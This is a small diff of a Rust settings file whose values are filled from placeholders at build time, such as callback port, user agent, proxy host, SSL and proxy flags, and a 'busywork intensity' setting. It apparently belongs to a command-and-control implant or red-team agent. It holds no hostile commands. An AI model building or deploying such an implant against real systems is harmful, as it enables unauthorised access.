@@ -11,8 +11,8 @@ pub static callback_port: &str = "%PORT%";
 pub static user_agent: &str = "%USERAGENT%";
 pub static proxy_host: &str = "%PROXYURL%";
 pub static chunk_size: usize = %CHUNKSIZE%;
-pub static use_ssl : bool = false; // TODO: %SSL%
-pub static use_proxy: bool = false; // TODO: %PROXYENABLED%
+pub static use_ssl: bool = %SSL%;
+pub static use_proxy: bool = %PROXYENABLED%;
 
 pub static busywork_intensity: &str = "%BUSYWORK_INTENSITY%";
 
